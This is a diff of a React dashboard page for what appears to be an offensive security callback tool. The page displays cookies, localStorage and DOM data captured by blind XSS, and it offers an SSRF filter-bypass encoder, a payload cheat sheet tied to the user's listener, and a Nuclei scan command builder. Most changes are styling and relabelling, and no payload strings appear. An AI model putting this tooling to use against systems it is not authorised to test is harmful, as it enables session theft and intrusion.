                 {/* DETAILED EXFILTRATION RECORDS */}
-                <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                   
                   {/* METADATA IDENTIFICATION */}
                   <section className={styles.dataCard}>
                     <div className={styles.sectionHeader}>
-                      <User size={16} style={{ color: '#7c4dff' }} />
-                      <h3 className={styles.sectionTitle}>Client Environment Meta</h3>
+                      <User size={15} style={{ color: 'var(--color-primary)' }} />
+                      <h3 className={styles.sectionTitle}>Client Environment</h3>
                     </div>
                     <table className={styles.headersTable}>
                       <tbody>
                         <tr>
-                          <td className={styles.headerKey}>Injected Page URL</td>
-                          <td className={styles.headerVal} style={{ color: '#7c4dff', wordBreak: 'break-all' }}>{selectedXss.uri}</td>
+                          <td className={styles.headerKey}>Page URL</td>
+                          <td className={styles.headerVal} style={{ wordBreak: 'break-all' }}>{selectedXss.uri}</td>
                         </tr>
                         <tr>
-                          <td className={styles.headerKey}>HTTP Referrer</td>
-                          <td className={styles.headerVal} style={{ wordBreak: 'break-all' }}>{selectedXss.referrer}</td>
+                          <td className={styles.headerKey}>Referrer</td>
+                          <td className={styles.headerVal} style={{ wordBreak: 'break-all' }}>{selectedXss.referrer || 'None'}</td>
                         </tr>
                         <tr>
-                          <td className={styles.headerKey}>Browser User-Agent</td>
+                          <td className={styles.headerKey}>User-Agent</td>
                           <td className={styles.headerVal}>{selectedXss.userAgent}</td>
                         </tr>
                       </tbody>
@@ -1927,8 +1377,8 @@ export default function DashboardPage({ params }) {
                   {/* COOKIES (SENSITIVE) */}
                   <section className={styles.dataCard}>
                     <div className={styles.sectionHeader}>
-                      <Cpu size={16} style={{ color: 'var(--color-error)' }} />
-                      <h3 className={styles.sectionTitle} style={{ color: 'var(--text-main)' }}>Captured Browser Cookies</h3>
+                      <Cpu size={15} style={{ color: 'var(--color-primary)' }} />
+                      <h3 className={styles.sectionTitle}>Captured Cookies</h3>
                       <button 
                         onClick={() => handleCopy(selectedXss.cookies, 'xsscookies')}
                         className={styles.copyBtn}
@@ -1937,7 +1387,7 @@ export default function DashboardPage({ params }) {
                         {copiedText === 'xsscookies' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                       </button>
                     </div>
-                    <pre className={styles.bodyPre} style={{ borderLeft: '3px solid var(--color-error)', background: '#0a050d', color: '#ff5252' }}>
+                    <pre className={styles.bodyPre}>
                       <code>{selectedXss.cookies || 'None (No active cookies found or cookies are secured via HTTP-Only)'}</code>
                     </pre>
                   </section>
@@ -1945,8 +1395,8 @@ export default function DashboardPage({ params }) {
                   {/* LOCAL STORAGE */}
                   <section className={styles.dataCard}>
                     <div className={styles.sectionHeader}>
-                      <Database size={16} style={{ color: '#7c4dff' }} />
-                      <h3 className={styles.sectionTitle}>Victim LocalStorage Data</h3>
+                      <Database size={15} style={{ color: 'var(--color-primary)' }} />
+                      <h3 className={styles.sectionTitle}>LocalStorage Data</h3>
                       <button 
                         onClick={() => handleCopy(selectedXss.localStorage, 'xsslocal')}
                         className={styles.copyBtn}
@@ -1963,8 +1413,8 @@ export default function DashboardPage({ params }) {
                   {/* DOM HTML CODE VIEW */}
                   <section className={styles.dataCard}>
                     <div className={styles.sectionHeader}>
-                      <FileCode size={16} style={{ color: '#00e676' }} />
-                      <h3 className={styles.sectionTitle}>Victim Page DOM Structure (HTML)</h3>
+                      <FileCode size={15} style={{ color: 'var(--color-primary)' }} />
+                      <h3 className={styles.sectionTitle}>Page DOM Structure (HTML)</h3>
                       <button 
                         onClick={() => handleCopy(selectedXss.dom, 'xssdom')}
                         className={styles.copyBtn}
@@ -1976,12 +1426,12 @@ export default function DashboardPage({ params }) {
                     <pre 
                       className={styles.bodyPre} 
                       style={{ 
-                        maxHeight: '400px', 
+                        maxHeight: '360px', 
                         overflowY: 'auto', 
                         fontFamily: 'monospace', 
                         fontSize: '0.75rem', 
-                        background: '#040608', 
-                        color: 'rgba(255, 255, 255, 0.8)' 
+                        whiteSpace: 'pre-wrap',
+                        wordBreak: 'break-all'
                       }}
                     >
                       <code>{selectedXss.dom}</code>
@@ -1996,40 +1446,39 @@ export default function DashboardPage({ params }) {
 
         {/* --- MODULE 3: STEALTH SSRF BYPASS GENERATOR --- */}
         {activeTab === 'SSRF' && (
-          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
+          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '24px 32px' }}>
             
             {/* Input target control */}
             <div 
               style={{ 
-                padding: '24px', 
-                background: 'rgba(255, 255, 255, 0.02)', 
-                borderRadius: 'var(--radius-xl)', 
+                padding: '20px', 
+                background: 'var(--bg-surface)', 
+                borderRadius: 'var(--radius-md)', 
                 border: '1px solid var(--border-light)', 
-                marginBottom: '30px',
-                boxShadow: '0 8px 32px rgba(0,0,0,0.2)'
+                marginBottom: '24px'
               }}
             >
-              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
-                <Zap size={18} style={{ color: 'var(--color-secondary)' }} />
-                <h2 style={{ fontSize: '1.2rem', fontWeight: '850', color: 'var(--text-main)' }}>STEALTH SSRF BYPASS ENGINES</h2>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
+                <Zap size={16} style={{ color: 'var(--color-primary)' }} />
+                <h2 style={{ fontSize: '1.05rem', fontWeight: '700', color: 'var(--text-main)' }}>SSRF URL Encoders & Bypasses</h2>
               </div>
-              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '18px', maxWidth: '620px' }}>
-                Type an IP address or localhost domain block. Our generator converts them instantly into obfuscated variations that trick strict regex parsers and blacklists.
+              <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '16px', maxWidth: '640px', lineHeight: '1.5' }}>
+                Test how target systems and backend HTTP clients parse alternative IP address encodings and redirect patterns to evaluate filter robustness.
               </p>
               
-              <div style={{ display: 'flex', gap: '12px' }}>
+              <div style={{ display: 'flex', gap: '10px' }}>
                 <input 
                   type="text" 
                   value={ssrfTarget}
                   onChange={(e) => setSsrfTarget(e.target.value)}
-                  placeholder="e.g., 127.0.0.1 or localhost"
+                  placeholder="e.g. 127.0.0.1 or localhost"
                   className="input-field"
-                  style={{ flex: 1, padding: '14px', fontSize: '0.9rem', fontFamily: 'monospace' }}
+                  style={{ flex: 1, padding: '10px 14px', fontSize: '0.85rem', fontFamily: 'monospace' }}
                 />
                 <button 
                   onClick={() => setSsrfTarget('127.0.0.1')}
                   className="btn-secondary"
-                  style={{ padding: '0 16px', fontSize: '0.85rem' }}
+                  style={{ padding: '0 16px', fontSize: '0.8rem' }}
                 >
                   Reset Loopback
                 </button>
@@ -2037,34 +1486,31 @@ export default function DashboardPage({ params }) {
             </div>
 
             {/* Generated results cards */}
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
-              <span style={{ fontSize: '0.85rem', fontWeight: '800', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '1px' }}>
-                SSRF ENCODED PAYLOADS GENERATED ({ssrfBypasses.length})
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+              <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-secondary)', textTransform: 'uppercase', letterSpacing: '0.04em' }}>
+                Generated Encodings ({ssrfBypasses.length})
               </span>
 
-              <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '16px' }}>
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '12px' }}>
                 {ssrfBypasses.map((bypass, idx) => (
                   <div 
                     key={idx} 
                     style={{ 
-                      padding: '20px', 
-                      background: 'rgba(8,11,18,0.7)', 
-                      borderRadius: 'var(--radius-lg)', 
+                      padding: '16px', 
+                      background: 'var(--bg-surface)', 
+                      borderRadius: 'var(--radius-sm)', 
                       border: '1px solid var(--border-light)', 
                       display: 'flex', 
                       flexDirection: 'column', 
-                      gap: '12px',
-                      transition: 'all 0.2s ease'
+                      gap: '10px'
                     }}
-                    onMouseEnter={(e) => e.currentTarget.style.borderColor = 'rgba(0, 242, 254, 0.2)'}
-                    onMouseLeave={(e) => e.currentTarget.style.borderColor = 'var(--border-light)'}
                   >
                     <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                      <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--color-primary)', textTransform: 'uppercase' }}>
+                      <span style={{ fontSize: '0.72rem', fontWeight: '700', color: 'var(--color-primary)', textTransform: 'uppercase', letterSpacing: '0.03em' }}>
                         {bypass.category}
                       </span>
-                      <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
-                        ID: SSRF-00{idx + 1}
+                      <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>
+                        #{idx + 1}
                       </span>
                     </div>
 
@@ -2072,18 +1518,18 @@ export default function DashboardPage({ params }) {
                       style={{ 
                         display: 'flex', 
                         alignItems: 'center', 
-                        background: '#040608', 
-                        border: '1px solid var(--border-medium)', 
-                        borderRadius: 'var(--radius-md)', 
-                        padding: '12px 16px',
-                        gap: '12px' 
+                        background: 'var(--bg-input)', 
+                        border: '1px solid var(--border-light)', 
+                        borderRadius: 'var(--radius-xs)', 
+                        padding: '10px 14px',
+                        gap: '10px' 
                       }}
                     >
                       <span 
                         style={{ 
-                          color: '#00e676', 
+                          color: 'var(--text-main)', 
                           fontFamily: 'monospace', 
-                          fontSize: '0.9rem', 
+                          fontSize: '0.85rem', 
                           fontWeight: '600', 
                           flex: 1, 
                           whiteSpace: 'nowrap', 
@@ -2098,11 +1544,11 @@ export default function DashboardPage({ params }) {
                         className={styles.copyBtn}
                         style={{ flexShrink: '0' }}
                       >
-                        {copiedText === `ssrf-${idx}` ? <Check size={15} style={{ color: 'var(--color-success)' }} /> : <Copy size={15} />}
+                        {copiedText === `ssrf-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                       </button>
                     </div>
 
-                    <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
+                    <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', lineHeight: '1.45', margin: 0 }}>
                       {bypass.desc}
                     </p>
                   </div>
@@ -2115,42 +1561,42 @@ export default function DashboardPage({ params }) {
 
         {/* --- MODULE 4: TACTICAL PAYLOADS CHEAT SHEET --- */}
         {activeTab === 'PAYLOADS' && (
-          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
+          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '24px 32px' }}>
             
-            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
-              <BookOpen size={18} style={{ color: 'var(--color-primary)' }} />
-              <h2 style={{ fontSize: '1.2rem', fontWeight: '850', color: 'var(--text-main)' }}>TACTICAL PAYLOAD LIBRARY</h2>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
+              <BookOpen size={16} style={{ color: 'var(--color-primary)' }} />
+              <h2 style={{ fontSize: '1.05rem', fontWeight: '700', color: 'var(--text-main)' }}>Payload Cheat Sheet</h2>
             </div>
-            <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '30px', maxWidth: '640px' }}>
-              A highly curated, searchable cheat sheet of vulnerability testing payloads. These payloads are **dynamically pre-compiled and configured** with your personal active webhook listener and XSS callback routing URLs! No manual editing needed.
+            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '24px', maxWidth: '640px', lineHeight: '1.5' }}>
+              Reference library of injection payloads configured with your active session listener and XSS callback URLs.
             </p>
 
             {/* List categories dynamically */}
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '32px' }}>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
               {filteredPayloads.length === 0 ? (
                 <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>
-                  <HelpCircle size={32} style={{ margin: '0 auto 12px', color: 'var(--text-dark)' }} />
-                  <p>No payloads match your current search and tier filter criteria.</p>
+                  <HelpCircle size={28} style={{ margin: '0 auto 8px', color: 'var(--text-muted)' }} />
+                  <p>No payloads match your current filter criteria.</p>
                 </div>
               ) : (
                 filteredPayloads.map(cat => (
-                  <section key={cat.category} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
-                      <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--color-primary)' }}></span>
-                      <h3 style={{ fontSize: '0.95rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                  <section key={cat.category} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '6px' }}>
+                      <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: 'var(--color-primary)' }}></span>
+                      <h3 style={{ fontSize: '0.85rem', fontWeight: '700', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.03em' }}>
                         {cat.title}
                       </h3>
                     </div>
 
-                    <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                       {cat.items.map((item, idx) => (
                         <div 
                           key={idx}
                           style={{
-                            padding: '18px',
-                            background: 'rgba(255,255,255,0.01)',
+                            padding: '16px',
+                            background: 'var(--bg-surface)',
                             border: '1px solid var(--border-light)',
-                            borderRadius: 'var(--radius-lg)',
+                            borderRadius: 'var(--radius-sm)',
                             display: 'flex',
                             flexDirection: 'column',
                             gap: '10px'
@@ -2158,73 +1604,29 @@ export default function DashboardPage({ params }) {
                         >
                           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                             <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
-                              <h4 style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
+                              <h4 style={{ fontSize: '0.82rem', fontWeight: '600', color: 'var(--text-main)', margin: 0 }}>
                                 {item.title}
                               </h4>
                               
                               {/* Tech Stack Badge */}
                               {item.tech && (
-                                <span 
-                                  style={{
-                                    fontSize: '0.58rem',
-                                    fontWeight: '800',
-                                    background: 'rgba(0, 230, 118, 0.08)',
-                                    color: '#00e676',
-                                    border: '1px solid rgba(0, 230, 118, 0.2)',
-                                    padding: '1px 6px',
-                                    borderRadius: '3px',
-                                    textTransform: 'uppercase',
-                                    fontFamily: 'monospace'
-                                  }}
-                                >
-                                  💻 {item.tech}
+                                <span className="badge badge-neutral">
+                                  {item.tech}
                                 </span>
                               )}
 
-                              {/* Dynamically Color-Coded Badges based on Era/Priority */}
+                              {/* Priority Badge */}
                               {item.priority === 'HIGH' ? (
-                                <span 
-                                  style={{ 
-                                    fontSize: '0.62rem', 
-                                    fontWeight: '750', 
-                                    background: 'rgba(255, 23, 68, 0.12)', 
-                                    color: '#ff1744', 
-                                    border: '1px solid rgba(255, 23, 68, 0.25)',
-                                    padding: '2px 8px',
-                                    borderRadius: '4px',
-                                    letterSpacing: '0.5px'
-                                  }}
-                                  className="animate-pulse-glow"
-                                >
-                                  🔥 HIGH TIER ({item.era})
+                                <span className="badge badge-error">
+                                  {item.era || 'High Priority'}
                                 </span>
                               ) : item.priority === 'MEDIUM' ? (
-                                <span 
-                                  style={{ 
-                                    fontSize: '0.62rem', 
-                                    fontWeight: '750', 
-                                    background: 'rgba(255, 145, 0, 0.12)', 
-                                    color: '#ff9100', 
-                                    border: '1px solid rgba(255, 145, 0, 0.25)',
-                                    padding: '2px 8px',
-                                    borderRadius: '4px'
-                                  }}
-                                >
-                                  ⚡ MID TIER ({item.era})
+                                <span className="badge badge-warning">
+                                  {item.era || 'Medium'}
                                 </span>
                               ) : (
-                                <span 
-                                  style={{ 
-                                    fontSize: '0.62rem', 
-                                    fontWeight: '700', 
-                                    background: 'rgba(150, 150, 150, 0.08)', 
-                                    color: '#a0a0a0', 
-                                    border: '1px solid rgba(150, 150, 150, 0.2)',
-                                    padding: '2px 8px',
-                                    borderRadius: '4px'
-                                  }}
-                                >
-                                  🪨 LOW TIER ({item.era})
+                                <span className="badge badge-neutral">
+                                  {item.era || 'Standard'}
                                 </span>
                               )}
                             </div>
@@ -2238,18 +1640,18 @@ export default function DashboardPage({ params }) {
                             style={{ 
                               display: 'flex', 
                               alignItems: 'center', 
-                              background: '#040608', 
-                              border: '1px solid var(--border-medium)', 
-                              borderRadius: 'var(--radius-md)', 
-                              padding: '12px 14px',
-                              gap: '12px' 
+                              background: 'var(--bg-input)', 
+                              border: '1px solid var(--border-light)', 
+                              borderRadius: 'var(--radius-xs)', 
+                              padding: '10px 14px',
+                              gap: '10px' 
                             }}
                           >
                             <span 
                               style={{ 
-                                color: '#00e676', 
+                                color: 'var(--text-main)', 
                                 fontFamily: 'monospace', 
-                                fontSize: '0.85rem', 
+                                fontSize: '0.82rem', 
                                 flex: 1, 
                                 whiteSpace: 'nowrap', 
                                 overflowX: 'auto',
@@ -2267,7 +1669,7 @@ export default function DashboardPage({ params }) {
                             </button>
                           </div>
 
-                          <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
+                          <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', lineHeight: '1.45', margin: 0 }}>
                             {item.desc}
                           </p>
                         </div>
@@ -2283,57 +1685,57 @@ export default function DashboardPage({ params }) {
 
         {/* --- MODULE 5: PROJECTDISCOVERY NUCLEI INTEGRATION & OOB SUITE --- */}
         {activeTab === 'NUCLEI' && (
-          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
+          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '24px 32px' }}>
             
             {/* Header Title & Badges */}
-            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', marginBottom: '24px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', marginBottom: '20px' }}>
               <div>
-                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '8px' }}>
-                  <Cpu size={22} style={{ color: '#00e676' }} />
-                  <h2 style={{ fontSize: '1.3rem', fontWeight: '850', color: 'var(--text-main)', letterSpacing: '0.5px' }}>
-                    NUCLEI AUTOMATION & OOB SUITE
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
+                  <Cpu size={18} style={{ color: 'var(--color-primary)' }} />
+                  <h2 style={{ fontSize: '1.15rem', fontWeight: '700', color: 'var(--text-main)' }}>
+                    Nuclei Automation & OOB Suite
                   </h2>
                 </div>
-                <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', maxWidth: '680px', lineHeight: '1.5' }}>
-                  Harness <strong>ProjectDiscovery Nuclei</strong> alongside your active Kestrel Ghost listener. Trigger Out-of-Band (OOB) callbacks for Blind SSRF, inject Blind XSS probes, and stream real-time vulnerability scan results directly into this dashboard.
+                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', maxWidth: '680px', lineHeight: '1.5' }}>
+                  Generate ProjectDiscovery Nuclei scanning templates configured for your active callback endpoint. Supports Out-of-Band SSRF, Blind XSS header fuzzing, and real-time webhook finding ingestion.
                 </p>
               </div>
 
               {/* Status Badges */}
               <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
-                <span style={{ fontSize: '0.65rem', fontWeight: '800', background: 'rgba(0, 230, 118, 0.1)', color: '#00e676', border: '1px solid rgba(0, 230, 118, 0.25)', padding: '4px 10px', borderRadius: '20px', fontFamily: 'monospace' }}>
-                  ● Nuclei v3.x Ready
+                <span className="badge badge-success">
+                  Nuclei v3.x Compatible
                 </span>
-                <span style={{ fontSize: '0.65rem', fontWeight: '800', background: 'rgba(0, 242, 254, 0.1)', color: 'var(--color-primary)', border: '1px solid rgba(0, 242, 254, 0.25)', padding: '4px 10px', borderRadius: '20px', fontFamily: 'monospace' }}>
-                  110,000+ Templates In Suite
+                <span className="badge badge-info">
+                  110,000+ Local Templates
                 </span>
               </div>
             </div>
 
             {/* Quick Navigation Filter Pills */}
-            <div style={{ display: 'flex', gap: '8px', overflowX: 'auto', paddingBottom: '12px', marginBottom: '24px' }}>
+            <div style={{ display: 'flex', gap: '8px', overflowX: 'auto', paddingBottom: '8px', marginBottom: '20px' }}>
               {[
-                { id: 'ALL', label: '🚀 All Modules' },
-                { id: 'BUILDER', label: '⚡ Interactive Command Builder' },
-                { id: 'OOB_SSRF', label: '🛰️ OOB SSRF / RCE Template' },
-                { id: 'BLIND_XSS', label: '🛡️ Blind XSS Header Fuzzer' },
-                { id: 'REPORTING', label: '🔔 Live Scan Webhook Export' },
-                { id: 'COMMUNITY', label: '📦 Local Community Templates' },
-                { id: 'CHEATSHEET', label: '📖 CLI Cheat Sheet' }
+                { id: 'ALL', label: 'All Sections' },
+                { id: 'BUILDER', label: 'Command Builder' },
+                { id: 'OOB_SSRF', label: 'SSRF / RCE Template' },
+                { id: 'BLIND_XSS', label: 'Blind XSS Fuzzer' },
+                { id: 'REPORTING', label: 'Live Webhook Export' },
+                { id: 'COMMUNITY', label: 'Template Presets' },
+                { id: 'CHEATSHEET', label: 'CLI Flags' }
               ].map(sec => (
                 <button
                   key={sec.id}
                   onClick={() => setSelectedNucleiSection(sec.id)}
                   style={{
-                    padding: '6px 14px',
-                    borderRadius: '20px',
+                    padding: '6px 12px',
+                    borderRadius: 'var(--radius-sm)',
                     fontSize: '0.75rem',
-                    fontWeight: '700',
+                    fontWeight: '600',
                     cursor: 'pointer',
                     whiteSpace: 'nowrap',
-                    border: selectedNucleiSection === sec.id ? '1px solid #00e676' : '1px solid var(--border-light)',
-                    background: selectedNucleiSection === sec.id ? 'rgba(0, 230, 118, 0.12)' : 'rgba(255,255,255,0.02)',
-                    color: selectedNucleiSection === sec.id ? '#00e676' : 'var(--text-muted)',
+                    border: selectedNucleiSection === sec.id ? '1px solid var(--color-primary)' : '1px solid var(--border-light)',
+                    background: selectedNucleiSection === sec.id ? 'var(--color-primary-dim)' : 'var(--bg-surface)',
+                    color: selectedNucleiSection === sec.id ? 'var(--color-primary)' : 'var(--text-secondary)',
                     transition: 'all 0.15s ease'
                   }}
                 >
@@ -2342,38 +1744,37 @@ export default function DashboardPage({ params }) {
               ))}
             </div>
 
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '32px' }}>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
 
               {/* 1. INTERACTIVE NUCLEI COMMAND BUILDER */}
               {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'BUILDER') && (
                 <div 
                   style={{ 
-                    padding: '24px', 
-                    background: 'rgba(10, 15, 26, 0.85)', 
-                    borderRadius: 'var(--radius-xl)', 
-                    border: '1px solid var(--border-medium)',
-                    boxShadow: '0 8px 32px rgba(0,0,0,0.3)',
+                    padding: '20px', 
+                    background: 'var(--bg-surface)', 
+                    borderRadius: 'var(--radius-md)', 
+                    border: '1px solid var(--border-light)',
                     display: 'flex',
                     flexDirection: 'column',
-                    gap: '18px'
+                    gap: '16px'
                   }}
                 >
                   <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                      <Terminal size={18} style={{ color: '#00e676' }} />
-                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', letterSpacing: '0.5px' }}>
-                        ⚡ INTERACTIVE NUCLEI COMMAND GENERATOR
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <Terminal size={16} style={{ color: 'var(--color-primary)' }} />
+                      <h3 style={{ fontSize: '0.92rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
+                        Command Generator
                       </h3>
                     </div>
                     <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
-                      Customized for Endpoint: {id}
+                      Endpoint: {id}
                     </span>
                   </div>
 
                   {/* Builder Form Grid */}
-                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '14px' }}>
+                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '12px' }}>
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                         Target URL or File
                       </label>
                       <input 
@@ -2382,48 +1783,48 @@ export default function DashboardPage({ params }) {
                         onChange={(e) => setBuilderTarget(e.target.value)}
                         placeholder="https://example.com or targets.txt"
                         className={styles.inputField}
-                        style={{ padding: '10px 12px', fontSize: '0.85rem', fontFamily: 'monospace' }}
+                        style={{ padding: '8px 12px', fontSize: '0.82rem', fontFamily: 'monospace' }}
                       />
                     </div>
 
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                         Template Strategy
                       </label>
                       <select
                         value={builderTemplateType}
                         onChange={(e) => setBuilderTemplateType(e.target.value)}
                         className={styles.selectField}
-                        style={{ padding: '10px 12px', fontSize: '0.85rem' }}
+                        style={{ padding: '8px 12px', fontSize: '0.82rem' }}
                       >
-                        <option value="OOB_SSRF">🛰️ Out-of-Band SSRF Callback Template</option>
-                        <option value="BLIND_XSS">🛡️ Blind XSS Header Fuzzer Template</option>
-                        <option value="ALL_CUSTOM">📦 All Local Custom Templates (C:\templates\)</option>
-                        <option value="WORDFENCE">🌐 WordPress Wordfence CVEs (C:\templates\topscoder...)</option>
-                        <option value="OFFICIAL_CVES">🎯 Official ProjectDiscovery CVEs (-t cves/)</option>
-                        <option value="FUZZING">⚡ PD Fuzzing Templates (C:\templates\projectdiscovery...)</option>
+                        <option value="OOB_SSRF">Out-of-Band SSRF Callback Template</option>
+                        <option value="BLIND_XSS">Blind XSS Header Fuzzer Template</option>
+                        <option value="ALL_CUSTOM">All Local Templates (C:\templates\)</option>
+                        <option value="WORDFENCE">WordPress Wordfence CVEs</option>
+                        <option value="OFFICIAL_CVES">Official ProjectDiscovery CVEs (-t cves/)</option>
+                        <option value="FUZZING">PD Fuzzing Templates</option>
                       </select>
                     </div>
 
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                         Severity Filter
                       </label>
                       <select
                         value={builderSeverity}
                         onChange={(e) => setBuilderSeverity(e.target.value)}
                         className={styles.selectField}
-                        style={{ padding: '10px 12px', fontSize: '0.85rem' }}
+                        style={{ padding: '8px 12px', fontSize: '0.82rem' }}
                       >
-                        <option value="critical,high">🔥 Critical & High Only</option>
-                        <option value="critical">💥 Critical Only</option>
-                        <option value="critical,high,medium">⚡ Critical, High, Medium</option>
-                        <option value="all">🌐 All Severities (including Low/Info)</option>
+                        <option value="critical,high">Critical & High Only</option>
+                        <option value="critical">Critical Only</option>
+                        <option value="critical,high,medium">Critical, High, Medium</option>
+                        <option value="all">All Severities</option>
                       </select>
                     </div>
 
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                         Rate Limit (req/sec)
                       </label>
                       <input 
@@ -2432,7 +1833,7 @@ export default function DashboardPage({ params }) {
                         onChange={(e) => setBuilderRateLimit(e.target.value)}
                         placeholder="50"
                         className={styles.inputField}
-                        style={{ padding: '10px 12px', fontSize: '0.85rem' }}
+                        style={{ padding: '8px 12px', fontSize: '0.82rem' }}
                       />
                     </div>
                   </div>
@@ -2458,18 +1859,18 @@ export default function DashboardPage({ params }) {
                         style={{ 
                           display: 'flex', 
                           alignItems: 'center', 
-                          background: '#040608', 
-                          border: '1px solid rgba(0, 230, 118, 0.3)', 
-                          borderRadius: 'var(--radius-md)', 
-                          padding: '14px 18px', 
+                          background: 'var(--bg-input)', 
+                          border: '1px solid var(--border-light)', 
+                          borderRadius: 'var(--radius-xs)', 
+                          padding: '12px 14px', 
                           gap: '12px' 
                         }}
                       >
                         <span 
                           style={{ 
-                            color: '#00e676', 
+                            color: 'var(--text-main)', 
                             fontFamily: 'monospace', 
-                            fontSize: '0.9rem', 
+                            fontSize: '0.82rem', 
                             fontWeight: '600', 
                             flex: 1, 
                             whiteSpace: 'nowrap', 
@@ -2481,16 +1882,16 @@ export default function DashboardPage({ params }) {
                         </span>
                         <button 
                           onClick={() => handleCopy(generatedCmd, 'builder-cmd')}
-                          className={styles.copyBtn}
-                          style={{ flexShrink: '0', padding: '6px 12px', background: 'rgba(0, 230, 118, 0.1)', border: '1px solid rgba(0, 230, 118, 0.25)', borderRadius: '6px' }}
+                          className="btn-secondary"
+                          style={{ flexShrink: '0', padding: '6px 12px', fontSize: '0.75rem' }}
                         >
